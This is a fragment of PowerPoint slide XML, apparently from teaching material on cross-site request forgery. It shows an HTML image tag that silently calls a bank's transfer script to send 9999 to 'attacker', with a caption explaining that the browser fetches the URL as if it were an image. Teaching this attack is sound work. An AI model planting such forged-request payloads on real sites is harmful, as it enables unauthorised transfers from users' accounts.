        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82959" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82960" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2294" b="1">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Browser automatically  visits the URL to obtain  what it believes will be  an image</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82961" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8517872" y="4406713"/>
            <a:ext cx="1881187" cy="1495985"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82962" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82963" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82964" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8691563" y="4920784"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
